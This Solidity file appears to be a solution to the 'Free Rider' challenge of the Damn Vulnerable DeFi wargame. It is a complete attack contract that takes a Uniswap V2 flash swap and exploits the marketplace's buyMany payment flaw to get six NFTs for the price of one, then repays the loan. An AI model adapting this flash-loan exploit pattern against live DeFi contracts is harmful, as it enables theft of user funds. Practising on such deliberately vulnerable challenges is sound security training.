// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC721} from "openzeppelin-contracts/token/ERC721/IERC721.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";

// Import FreeRiderNFTMarketplace
import "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";

interface IWETH {
    function withdraw(uint256 wad) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

// solution from: https://www.youtube.com/watch?v=bdM8Qs6JUro
contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
    using Address for address;

    address payable immutable weth;
    address immutable dvt;
    address immutable factory;
    address payable immutable buyerMarketplace;
    address immutable buyer;
    address immutable nft;

    constructor(
        address payable _weth,
        address _factory,
        address _dvt,
        address payable _buyerMarketplace,
        address _buyer,
        address _nft
    ) {
        weth = _weth;
        factory = _factory;
        dvt = _dvt;
        buyerMarketplace = _buyerMarketplace;
        buyer = _buyer;
        nft = _nft;
    }

    event Log(string message, uint256 val);

    // Intiate flash swap
    function flashSwap(address _tokenBorrow, uint256 _amount) external {
        // Ensure there is a pair address contract available
        address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
        require(pair != address(0), "!pair init");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        // Ensure we are borrowing the correct token (WETH)
        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenBorrow, _amount);

        // Call uniswap for a flashswap
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    // Flash Swap callback from UniSwap
    function uniswapV2Call(address sender, uint256, uint256, bytes calldata data) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);

        // Ensure the pair contract is the same as the sender
        // and this contract was the one that initiated it.
        require(msg.sender == pair, "!pair");
        require(sender == address(this), "!sender");

        // Decode custom data set in flashLoan()
        (address tokenBorrow, uint256 amount) = abi.decode(data, (address, uint256));

        // Calculate Loan repayment
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // at this point this contract should have the requested balance of the borrow token
        uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this));

        // Since we need ETH for the attack we withdraw all WETH to ETH
        IWETH(tokenBorrow).withdraw(currBal);

        // Load uint256s
        // uint256[6] memory tokenIds = [0, 1, 2, 3, 4, 5]; (unfortunately, simple assignment does not work!)
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        // Purchase all NFTs for the Price of 1
        FreeRiderNFTMarketplace(buyerMarketplace).buyMany{value: 15 ether}(tokenIds);

        // Transfer newly attained NFTs to Buyer Contract
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
        }

        // Deposit ETH into WETH contract
        // ETH came from Buyer Contract + Marketplace exploit
        (bool success,) = weth.call{value: 15.1 ether}("");
        require(success, "failed to deposit weth");

        // Pay back Loan with deposited WETH funds
        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    // Interface required to receive NFT as a Smart Contract
    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
